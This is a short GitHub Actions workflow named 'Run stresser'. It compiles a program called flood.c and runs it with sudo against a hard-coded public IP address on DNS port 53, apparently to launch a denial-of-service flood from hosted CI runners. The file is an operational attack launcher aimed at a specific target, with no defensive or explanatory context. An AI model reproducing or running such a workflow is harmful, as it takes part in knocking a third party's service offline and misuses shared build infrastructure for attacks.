name: Run stresser
on: workflow_dispatch
jobs:
  compare:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v6
      - run: |
          gcc -O3 -std=c2x -pthread -flto -march=native flood.c -o flood
          sudo ./flood 103.67.202.153 53
